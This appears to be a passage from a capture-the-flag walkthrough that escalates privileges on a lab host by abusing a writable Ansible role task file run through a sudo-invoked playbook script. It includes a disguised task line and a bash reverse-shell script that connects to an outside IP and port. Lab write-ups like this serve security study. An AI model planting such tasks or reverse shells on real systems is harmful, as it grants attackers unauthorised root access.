#### SCRIPTS

---

This part only has some code called *infra_as_code.sh*

```bash
[theodore@aratus scripts]$ cat infra_as_code.sh 

#!/bin/bash
cd /opt/ansible
/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml

```

#### ANSIBLE

---

It is defined as infrastructure as a service

-rwxr-xr-x. 1 root root 5933 Jan 15  2022 /usr/bin/ansible-2.7

##### README

---

```txt
[theodore@aratus ansible]$ cat README.txt 
To do:
- Move vsftpd to IoC
- Move firewalld to IoC
- Move sshd to IoC
- Move smbd to IoC
- Feed the cats before they start rioting

Done:
- Move Apache to IoC
- Create script to not use 'automation' directly
- Scold Simeon

```

##### PLAYBOOKS

---

None of the playbooks are writeable sadly :\*< sadly, but maybie we can make do with this.

```bash
[theodore@aratus playbooks]$ ls -la
total 20
drwxr-xr-x. 2 automation automation  99 Nov 23  2021 .
drwxr-x---. 4 automation theodore    90 Nov 23  2021 ..
-rw-r--r--. 1 automation automation 156 Nov 23  2021 firewalld.yaml
-rw-r--r--. 1 automation automation 312 Nov 23  2021 httpd.yaml
-rw-r--r--. 1 automation automation 140 Nov 23  2021 smbd.yaml
-rw-r--r--. 1 automation automation 138 Nov 23  2021 sshd.yaml
-rw-r--r--. 1 automation automation 145 Nov 23  2021 vsftpd.yaml
```

##### ROLES :  geerlingguy.apache

Can write into the following files:

```
-rw-rw-r--+ 1 automation automation 1123 Dec  2  2021 ./tasks/configure-RedHat.yml
```

We can write a simple reverse shell with this (just echo into it since i did not have much to do with this)

```yaml
- name: very important task do not remove it trust me bro
  command: "bash /home/theodore/scripts/trustmebro.sh"
```

The file trustmebro.sh is defined as 

```bash 
#!/bin/bash
bash -i >& /dev/tcp/10.10.160.7/6666 0>&1
```

And we can execute it with sudo privileges to be automation.

After doing this i thought i was going to be automation not root but ok i guess :).

After this we have [[root]]